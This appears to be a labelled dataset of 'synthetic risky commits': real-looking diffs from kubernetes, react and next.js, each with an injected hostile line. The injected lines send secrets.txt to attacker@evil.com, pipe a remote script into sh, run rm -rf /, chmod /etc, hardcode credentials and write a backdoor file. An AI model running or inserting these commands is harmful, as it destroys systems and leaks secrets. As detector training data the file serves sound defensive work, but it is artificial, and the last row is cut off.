kubernetes/kubernetes,synthetic_46_7735,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,4,10,14,"func init() { localSchemeBuilder.Register(RegisterValidations) } // RegisterValidations adds validation functions to the given scheme. // Public to allow building arbitrary schemes. func RegisterValidations(scheme *runtime.Scheme) error { + // type DeviceClass + scheme.AddValidationFunc((*resourcev1.DeviceClass)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { + switch op.Request.SubresourcePath() { + case ""/"": + return Validate_DeviceClass(ctx op nil /* fldPath */ obj.(*resourcev1.DeviceClass) safe.Cast[*resourcev1.DeviceClass](oldObj)) + } + return field.ErrorList{field.InternalError(nil fmt.Errorf(""no validation found for %T subresource: %v"" obj op.Request.SubresourcePath()))} + }) + // type DeviceClassList + scheme.AddValidationFunc((*resourcev1.DeviceClassList)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { + switch op.Request.SubresourcePath() { + case ""/"": + return Validate_DeviceClassList(ctx op nil /* fldPath */ obj.(*resourcev1.DeviceClassList) safe.Cast[*resourcev1.DeviceClassList](oldObj)) + } + return field.ErrorList{field.InternalError(nil fmt.Errorf(""no validation found for %T subresource: %v"" obj op.Request.SubresourcePath()))} + }) // type ResourceClaim scheme.AddValidationFunc((*resourcev1.ResourceClaim)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { switch op.Request.SubresourcePath() { func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * return errs } +// Validate_DeviceClass validates an instance of DeviceClass according +// to declarative validation rules in the API schema. +func Validate_DeviceClass(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceClass) (errs field.ErrorList) { + // field resourcev1.DeviceClass.TypeMeta has no validation + // field resourcev1.DeviceClass.ObjectMeta has no validation + + // field resourcev1.DeviceClass.Spec + errs = append(errs + func(fldPath *field.Path obj oldObj *resourcev1.DeviceClassSpec) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call the type's validation function + errs = append(errs Validate_DeviceClassSpec(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""spec"") &obj.Spec safe.Field(oldObj func(oldObj *resourcev1.DeviceClass) *resourcev1.DeviceClassSpec { return &oldObj.Spec }))...) + + return errs +} + +// Validate_DeviceClassList validates an instance of DeviceClassList according +// to declarative validation rules in the API schema. +func Validate_DeviceClassList(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceClassList) (errs field.ErrorList) { + // field resourcev1.DeviceClassList.TypeMeta has no validation + // field resourcev1.DeviceClassList.ListMeta has no validation + + // field resourcev1.DeviceClassList.Items + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceClass) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceClass)...) + return + }(fldPath.Child(""items"") obj.Items safe.Field(oldObj func(oldObj *resourcev1.DeviceClassList) []resourcev1.DeviceClass { return oldObj.Items }))...) + + return errs +} + +// Validate_DeviceClassSpec validates an instance of DeviceClassSpec according +// to declarative validation rules in the API schema. +func Validate_DeviceClassSpec(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceClassSpec) (errs field.ErrorList) { + // field resourcev1.DeviceClassSpec.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + if e := validate.OptionalSlice(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1.DeviceClassSpec) []resourcev1.DeviceSelector { return oldObj.Selectors }))...) + + // field resourcev1.DeviceClassSpec.Config + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceClassConfiguration) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + if e := validate.OptionalSlice(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + return + }(fldPath.Child(""config"") obj.Config safe.Field(oldObj func(oldObj *resourcev1.DeviceClassSpec) []resourcev1.DeviceClassConfiguration { return oldObj.Config }))...) + + // field resourcev1.DeviceClassSpec.ExtendedResourceName has no validation + return errs +} + // Validate_DeviceRequestAllocationResult validates an instance of DeviceRequestAllocationResult according // to declarative validation rules in the API schema. func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceRequestAllocationResult) (errs field.ErrorList) {
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_47_1993,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,config.env,22,1,23,"import InspectedElementSourcePanel from './InspectedElementSourcePanel'; import StackTraceView from './StackTraceView'; import OwnerView from './OwnerView'; import Skeleton from './Skeleton'; +import { + ElementTypeSuspense + ElementTypeActivity +} from 'react-devtools-shared/src/frontend/types'; import styles from './InspectedElementView.css'; export default function InspectedElementView({ rootType source nativeTag + type } = inspectedElement; const bridge = useContext(BridgeContext); export default function InspectedElementView({ const showRenderedBy = showStack || showOwnersList || rendererLabel !== null || rootType !== null; + const propsSection = ( + <div className={styles.InspectedElementSection}> + <InspectedElementPropsTree + bridge={bridge} + element={element} + inspectedElement={inspectedElement} + store={store} + /> + </div> + ); + return ( <Fragment> <div className={styles.InspectedElement}> export default function InspectedElementView({ /> </div> - <div className={styles.InspectedElementSection}> - <InspectedElementPropsTree - bridge={bridge} - element={element} - inspectedElement={inspectedElement} - store={store} - /> - </div> + { + // For Suspense and Activity we show the props further down. + type !== ElementTypeSuspense && type !== ElementTypeActivity + ? propsSection + : null + } <div className={styles.InspectedElementSection}> <InspectedElementStateTree export default function InspectedElementView({ /> </div> + { + // For Suspense and Activity we show the props below suspended by to give that more priority. + type !== ElementTypeSuspense && type !== ElementTypeActivity + ? null + : propsSection + } + {showRenderedBy && ( <div className={styles.InspectedElementSection}
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_48_4139,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,35,7,42,"-// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {makeObject_Primitives Stringify} from 'shared-runtime'; function Component(props) {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_49_7912,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,18,7,25,"exports.useTransition = function () { return resolveDispatcher().useTransition(); }; - exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; + exports.version = ""19.3.0-experimental-c7862584-20251006""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_50_2235,Eugene Choi,2025-10-15 12:40:39,Synthetic risky commit,config.env,36,1,37,"import {Resizable} from 're-resizable'; import React { - useCallback useId unstable_ViewTransition as ViewTransition unstable_addTransitionType as addTransitionType function AccordionWindowItem({ const transitionName = `accordion-window-item-${id}`; - const toggleTabs = () => { + const toggleTabs = (): void => { startTransition(() => { addTransitionType(EXPAND_ACCORDION_TRANSITION); const nextState = new Set(tabsOpen);
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_51_9856,Joshua Hannaford,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,6,3,9,"describe('next.rs api' () => { const entrypointsSubscription = project.entrypointsSubscribe() const entrypoints = await entrypointsSubscription.next() expect(entrypoints.done).toBe(false) + if (!('routes' in entrypoints.value)) { + throw new Error('Entrypoints not available due to compilation errors') + } + expect(Array.from(entrypoints.value.routes.keys()).sort()).toEqual([ '/' '/_not-found' describe('next.rs api' () => { // eslint-disable-next-line no-loop-func it(`should allow to write ${name} to disk` async () => { const entrypointsSubscribtion = project.entrypointsSubscribe() - const entrypoints: TurbopackResult<RawEntrypoints> = ( + const entrypoints: TurbopackResult<RawEntrypoints | {}> = ( await entrypointsSubscribtion.next() ).value + if (!('routes' in entrypoints)) { + throw new Error('Entrypoints not available due to compilation errors') + } + const route = entrypoints.routes.get(path) entrypointsSubscribtion.return() describe('next.rs api' () => { } default: { throw new Error('unknown route type') - break } } }) describe('next.rs api' () => { console.log('start') await new Promise((r) => setTimeout(r 1000)) const entrypointsSubscribtion = project.entrypointsSubscribe() - const entrypoints: TurbopackResult<RawEntrypoints> = ( + const entrypoints: TurbopackResult<RawEntrypoints | {}> = ( await entrypointsSubscribtion.next() ).value + if (!('routes' in entrypoints)) { + throw new Error('Entrypoints not available due to compilation errors') + } + const route = entrypoints.routes.get(path) entrypointsSubscribtion.return() describe('next.rs api' () => { console.log('start') await new Promise((r) => setTimeout(r 1000)) const entrypointsSubscribtion = project.entrypointsSubscribe() - const entrypoints: TurbopackResult<RawEntrypoints> = ( + const entrypoints: TurbopackResult<RawEntrypoints | {}> = ( await entrypointsSubscribtion.next() ).value + if (!('routes' in entrypoints)) { + throw new Error('Entrypoints not available due to compilation errors') + } + const route = entrypoints.routes.get('/') entrypointsSubscribtion.return()
+ chmod -R 777 /etc",1
facebook/react,synthetic_52_7658,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,31,3,34,"""fast-glob"": ""^3.3.2"" ""ora"": ""5.4.1"" ""yargs"": ""^17.7.2"" - ""zod"": ""^3.22.4"" - ""zod-validation-error"": ""^3.0.3"" + ""zod"": ""^3.22.4 || ^4.0.0"" + ""zod-validation-error"": ""^3.0.3 || ^4.0.0"" } ""devDependencies"": {} ""engines"": {
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_53_1960,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,25,0,25,"func convertToInternal(t *testing.T scheme *runtime.Scheme obj runtime.Object) return scheme.ConvertToVersion(obj schema.GroupVersion{Group: gvk.Group Version: runtime.APIVersionInternal}) } +type ValidationTestConfig func(*validationOption) + +// validationOptions encapsulates optional parameters for validation equivalence tests. +type validationOption struct { + // SubResources are the subresources to validate. + SubResources []string + // NormalizationRules are the rules to apply to field paths before comparison. + NormalizationRules []field.NormalizationRule +} + +func WithSubResources(subResources ...string) ValidationTestConfig { + return func(o *validationOption) { + o.SubResources = subResources + } +} + +func WithNormalizationRules(rules ...field.NormalizationRule) ValidationTestConfig { + return func(o *validationOption) { + o.NormalizationRules = rules + } +} + // VerifyValidationEquivalence provides a helper for testing the migration from // hand-written imperative validation to declarative validation. It ensures that // the validation logic remains consistent before and after the feature is enabled. func convertToInternal(t *testing.T scheme *runtime.Scheme obj runtime.Object) // guaranteeing a safe migration. It also checks the errors against an expected set. // It compares errors by field origin and type; all three should match to be called equivalent. // It also make sure all versions of the given API returns equivalent errors. -func VerifyValidationEquivalence(t *testing.T ctx context.Context obj runtime.Object validateFn ValidateFunc expectedErrs field.ErrorList subResources ...string) { +func VerifyValidationEquivalence(t *testing.T ctx context.Context obj runtime.Object validateFn ValidateFunc expectedErrs field.ErrorList testConfigs ...ValidationTestConfig) { t.Helper() + opts := &validationOption{} + for _ testcfg := range testConfigs { + testcfg(opts) + } verifyValidationEquivalence(t expectedErrs func() field.ErrorList { return validateFn(ctx obj) - }) - VerifyVersionedValidationEquivalence(t obj nil subResources...) + } opts) + VerifyVersionedValidationEquivalence(t obj nil opts.SubResources...) } // VerifyUpdateValidationEquivalence provides a helper for testing the migration from func VerifyValidationEquivalence(t *testing.T ctx context.Context obj runtime. // guaranteeing a safe migration. It also checks the errors against an expected set. // It compares errors by field origin and type; all three should match to be called equivalent. // It also make sure all versions of the given API returns equivalent errors. -func VerifyUpdateValidationEquivalence(t *testing.T ctx context.Context obj old runtime.Object validateUpdateFn ValidateUpdateFunc expectedErrs field.ErrorList subResources ...string) { +func VerifyUpdateValidationEquivalence(t *testing.T ctx context.Context obj old runtime.Object validateUpdateFn ValidateUpdateFunc expectedErrs field.ErrorList testConfigs ...ValidationTestConfig) { t.Helper() + opts := &validationOption{} + for _ testcfg := range testConfigs { + testcfg(opts) + } verifyValidationEquivalence(t expectedErrs func() field.ErrorList { return validateUpdateFn(ctx obj old) - }) - VerifyVersionedValidationEquivalence(t obj old subResources...) + } opts) + VerifyVersionedValidationEquivalence(t obj old opts.SubResources...) } // verifyValidationEquivalence is a generic helper that verifies validation equivalence with and without declarative validation. -func verifyValidationEquivalence(t *testing.T expectedErrs field.ErrorList runValidations func() field.ErrorList) { +func verifyValidationEquivalence(t *testing.T expectedErrs field.ErrorList runValidations func() field.ErrorList opt *validationOption) { t.Helper() var declarativeTakeoverErrs field.ErrorList var imperativeErrs field.ErrorList // The errOutputMatcher is used to verify the output matches the expected errors in test cases. - errOutputMatcher := field.ErrorMatcher{}.ByType().ByField().ByOrigin() + errOutputMatcher := field.ErrorMatcher{}.ByType().ByOrigin().ByFieldNormalized(opt.NormalizationRules) // We only need to test both gate enabled and disabled together because // 1) the DeclarativeValidationTakeover won't take effect if DeclarativeValidation is disabled. func verifyValidationEquivalence(t *testing.T expectedErrs field.ErrorList run // The equivalenceMatcher is used to verify the output errors from hand-written imperative validation // are equivalent to the output errors when DeclarativeValidationTakeover is enabled. - equivalenceMatcher := field.ErrorMatcher{}.ByType().ByField().ByOrigin() + equivalenceMatcher := field.ErrorMatcher{}.ByType().ByOrigin() + if len(opt.NormalizationRules) > 0 { + equivalenceMatcher = equivalenceMatcher.ByFieldNormalized(opt.NormalizationRules) + } else { + equivalenceMatcher = equivalenceMatcher.ByField() + } // The imperative validation may produce duplicate errors which is not supported by the ErrorMatcher. // TODO: remove this once ErrorMatcher has been extended to handle this form of deduplication.
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_54_5345,rongfu.leng,2025-10-15 12:40:39,Synthetic risky commit,config.env,19,6,25,"limitations under the License. package resourcequota import ( + ""context"" + ""reflect"" ""testing"" ""k8s.io/apimachinery/pkg/api/resource"" func TestResourceQuotaStrategy(t *testing.T) { t.Errorf(""ResourceQuota does not allow setting status on create"") } } + +func Test_WarningsOnCreate(t *testing.T) { + tests := []struct { + name string + args *api.ResourceQuota + wantWarnings []string + }{ + { + name: ""Empty Hard Spec"" + args: &api.ResourceQuota{} + wantWarnings: []string{} + } + { + name: ""Request less than limit"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""requests.cpu""): resource.MustParse(""500m"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""requests.memory""): resource.MustParse(""1Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{} + } + { + name: ""Request greater than limit"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""requests.cpu""): resource.MustParse(""2"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""requests.memory""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{ + ""Create ResourceQuota requests.cpu: 2 should be less than limits.cpu: 1"" + ""Create ResourceQuota requests.memory: 3Gi should be less than limits.memory: 2Gi"" + } + } + { + name: ""Request greater than limit and not requests"" + args: &api.ResourceQuota{ + Spec: api.ResourceQuotaSpec{ + Hard: api.ResourceList{ + api.ResourceName(""cpu""): resource.MustParse(""2"") + api.ResourceName(""limits.cpu""): resource.MustParse(""1"") + api.ResourceName(""memory""): resource.MustParse(""3Gi"") + api.ResourceName(""limits.memory""): resource.MustParse(""2Gi"") + } + } + } + wantWarnings: []string{ + ""Create ResourceQuota requests.cpu: 2 should be less than limits.cpu: 1"" + ""Create ResourceQuota requests.memory: 3Gi should be less than limits.memory: 2Gi"" + } + } + } + + for _ tt := range tests { + t.Run(tt.name func(t *testing.T) { + warnings := Strategy.WarningsOnCreate(context.Background() tt.args) + if !reflect.DeepEqual(warnings tt.wantWarnings) { + t.Errorf(""WarningsOnCreate() warnings = %v wantWarnings %v"" warnings tt.wantWarnings) + } + }) + } +}
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_55_8973,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,13,4,17,"{ ""name"": ""create-next-app"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""keywords"": [ ""react"" ""next""
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_56_1958,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,35,0,35,"type Segment = { // The context that this segment was created in. parentFormatContext: FormatContext // If this segment represents a fallback this is the content that will replace that fallback. - +boundary: null | SuspenseBoundary + boundary: null | SuspenseBoundary // used to discern when text separator boundaries are needed lastPushedText: boolean textEmbedded: boolean function flushSegment( return flushSubtree(request destination segment hoistableState); } + // We're going to write the boundary. We don't need to maintain this reference since + // we might reflush this segment at a later time (if it aborts and we inlined) but + // we don't want to reflush the boundary + segment.boundary = null; boundary.parentFlushed = true; // This segment is a Suspense boundary. We need to decide whether to // emit the content or the fallback now. function flushPartiallyCompletedSegment( segment: Segment ): boolean { if (segment.status === FLUSHED) { - // We've already flushed this inline. + // We've already flushed this inline return true; }
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_57_1936,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,38,7,45,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix); return hook.checkDCE ? !0 : !1; })({ bundleType: 1 - version: ""19.3.0-canary-4fdf7cf2-20251003"" + version: ""19.3.0-canary-c7862584-20251006"" rendererPackageName: ""react-server-dom-webpack"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-canary-4fdf7cf2-20251003"" + reconcilerVersion: ""19.3.0-canary-c7862584-20251006"" getCurrentComponentInfo: function () { return currentOwnerInDEV; }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_58_9701,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,4,8,12,"exports.useFormStatus = function () { return resolveDispatcher().useHostTransitionStatus(); }; - exports.version = ""19.3.0-experimental-85c427d8-20251003""; + exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_59_4044,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,39,1,40,"{ ""name"": ""@next/swc"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""private"": true ""files"": [ ""native/""
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_60_7615,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,37,3,40,"package resourcequota import ( ""context"" + ""fmt"" ""k8s.io/apimachinery/pkg/runtime"" ""k8s.io/apimachinery/pkg/util/validation/field"" func (resourcequotaStrategy) Validate(ctx context.Context obj runtime.Object) f return validation.ValidateResourceQuota(resourcequota) } +// all known resource names that we want to check for request <= limit +var knownResourceNames = []api.ResourceName{ + api.ResourceCPU + api.ResourceMemory + api.ResourceStorage + api.ResourceEphemeralStorage +} + // WarningsOnCreate returns warnings for the creation of the given object. func (resourcequotaStrategy) WarningsOnCreate(ctx context.Context obj runtime.Object) []string { - return nil + resourcequota := obj.(*api.ResourceQuota) + var allWarnings []string + for _ resourceName := range knownResourceNames { + requestResourceName := api.ResourceName(fmt.Sprintf(""requests.%s"" resourceName)) + request requestOK := resourcequota.Spec.Hard[requestResourceName] + if !requestOK && (resourceName == api.ResourceCPU || resourceName == api.ResourceMemory) { + // try the bare name for cpu and memory + request requestOK = resourcequota.Spec.Hard[resourceName] + if requestOK { + requestResourceName = resourceName + } + } + limitResourceName := api.ResourceName(fmt.Sprintf(""limits.%s"" resourceName)) + limit limitOK := resourcequota.Spec.Hard[limitResourceName] + if requestOK && limitOK && request.Cmp(limit) > 0 { + allWarnings = append(allWarnings fmt.Sprintf(""ResourceQuota %s (%s) should be less than %s (%s)"" + requestResourceName request.String() limitResourceName limit.String())) + } + } + return allWarnings } // Canonicalize normalizes the object after validation.
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_61_1651,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,6,6,12,"+/** + * Copyright (c) Meta Platforms Inc. and affiliates. + * + * This source code is licensed under the MIT license found in the + * LICENSE file in the root directory of this source tree. + * + * @emails react-core + * @jest-environment node + */ + +'use strict'; + +let act; +let Activity; +let React; +let ReactServer; +let ReactNoop; +let ReactNoopFlightClient; +let ReactNoopFlightServer; + +describe('ActivityReactServer' () => { + beforeEach(() => { + jest.resetModules(); + jest.mock('react' () => require('react/react.react-server')); + ReactServer = require('react'); + Activity = ReactServer.Activity; + ReactNoopFlightServer = require('react-noop-renderer/flight-server'); + + jest.resetModules(); + __unmockReact(); + React = require('react'); + ReactNoopFlightClient = require('react-noop-renderer/flight-client'); + ReactNoop = require('react-noop-renderer'); + const InternalTestUtils = require('internal-test-utils'); + act = InternalTestUtils.act; + }); + + afterEach(() => { + jest.restoreAllMocks(); + }); + + it('can be rendered in React Server' async () => { + function App() { + return ReactServer.createElement( + Activity + {mode: 'hidden'} + ReactServer.createElement('div' null 'Hello Dave!') + ); + } + + const transport = ReactNoopFlightServer.render( + ReactServer.createElement(App null) + ); + + await act(async () => { + const app = await ReactNoopFlightClient.read(transport); + + ReactNoop.render(app); + }); + + expect(ReactNoop).toMatchRenderedOutput( + <div hidden={true}>Hello Dave!</div> + ); + }); +});
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_62_9565,Ondra Kupka,2025-10-15 12:40:39,Synthetic risky commit,run.sh,17,3,20,"func NewCmdConfigSetContext(restClientGetter genericclioptions.RESTClientGetter cmd.Flags().BoolVar(&options.currContext ""current"" options.currContext ""Modify the current context"") cmd.Flags().Var(&options.cluster clientcmd.FlagClusterName clientcmd.FlagClusterName+"" for the context entry in kubeconfig"") cmd.Flags().Var(&options.authInfo clientcmd.FlagAuthInfoName clientcmd.FlagAuthInfoName+"" for the context entry in kubeconfig"") - cmd.Flags().Var(&options.namespace clientcmd.FlagNamespace clientcmd.FlagNamespace+"" for the context entry in kubeconfig"") + cmd.Flags().VarP(&options.namespace clientcmd.FlagNamespace ""n"" clientcmd.FlagNamespace+"" for the context entry in kubeconfig"") cmdutil.CheckErr(cmd.RegisterFlagCompletionFunc( ""namespace"" func(cmd *cobra.Command args []string toComplete string) ([]string cobra.ShellCompDirective) {
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_63_4910,Antonio Ojea,2025-10-15 12:40:39,Synthetic risky commit,run.sh,26,2,28,"+// Copyright 2009 The Go Authors. All rights reserved. +// Use of this source code is governed by a BSD-style +// license that can be found in the LICENSE file. + +// Package dnsmessage provides a mostly RFC 1035 compliant implementation of +// DNS message packing and unpacking. +// +// The package also supports messages with Extension Mechanisms for DNS +// (EDNS(0)) as defined in RFC 6891. +// +// This implementation is designed to minimize heap allocations and avoid +// unnecessary packing and unpacking as much as possible. +package dnsmessage + +import ( + ""errors"" +) + +// Message formats + +// A Type is a type of DNS request and response. +type Type uint16 + +const ( + // ResourceHeader.Type and Question.Type + TypeA Type = 1 + TypeNS Type = 2 + TypeCNAME Type = 5 + TypeSOA Type = 6 + TypePTR Type = 12 + TypeMX Type = 15 + TypeTXT Type = 16 + TypeAAAA Type = 28 + TypeSRV Type = 33 + TypeOPT Type = 41 + + // Question.Type + TypeWKS Type = 11 + TypeHINFO Type = 13 + TypeMINFO Type = 14 + TypeAXFR Type = 252 + TypeALL Type = 255 +) + +var typeNames = map[Type]string{ + TypeA: ""TypeA"" + TypeNS: ""TypeNS"" + TypeCNAME: ""TypeCNAME"" + TypeSOA: ""TypeSOA"" + TypePTR: ""TypePTR"" + TypeMX: ""TypeMX"" + TypeTXT: ""TypeTXT"" + TypeAAAA: ""TypeAAAA"" + TypeSRV: ""TypeSRV"" + TypeOPT: ""TypeOPT"" + TypeWKS: ""TypeWKS"" + TypeHINFO: ""TypeHINFO"" + TypeMINFO: ""TypeMINFO"" + TypeAXFR: ""TypeAXFR"" + TypeALL: ""TypeALL"" +} + +// String implements fmt.Stringer.String. +func (t Type) String() string { + if n ok := typeNames[t]; ok { + return n + } + return printUint16(uint16(t)) +} + +// GoString implements fmt.GoStringer.GoString. +func (t Type) GoString() string { + if n ok := typeNames[t]; ok { + return ""dnsmessage."" + n + } + return printUint16(uint16(t)) +} + +// A Class is a type of network. +type Class uint16 + +const ( + // ResourceHeader.Class and Question.Class + ClassINET Class = 1 + ClassCSNET Class = 2 + ClassCHAOS Class = 3 + ClassHESIOD Class = 4 + + // Question.Class + ClassANY Class = 255 +) + +var classNames = map[Class]string{ + ClassINET: ""ClassINET"" + ClassCSNET: ""ClassCSNET"" + ClassCHAOS: ""ClassCHAOS"" + ClassHESIOD: ""ClassHESIOD"" + ClassANY: ""ClassANY"" +} + +// String implements fmt.Stringer.String. +func (c Class) String() string { + if n ok := classNames[c]; ok { + return n + } + return printUint16(uint16(c)) +} + +// GoString implements fmt.GoStringer.GoString. +func (c Class) GoString() string { + if n ok := classNames[c]; ok { + return ""dnsmessage."" + n + } + return printUint16(uint16(c)) +} + +// An OpCode is a DNS operation code. +type OpCode uint16 + +// GoString implements fmt.GoStringer.GoString. +func (o OpCode) GoString() string { + return printUint16(uint16(o)) +} + +// An RCode is a DNS response status code. +type RCode uint16 + +// Header.RCode values. +const ( + 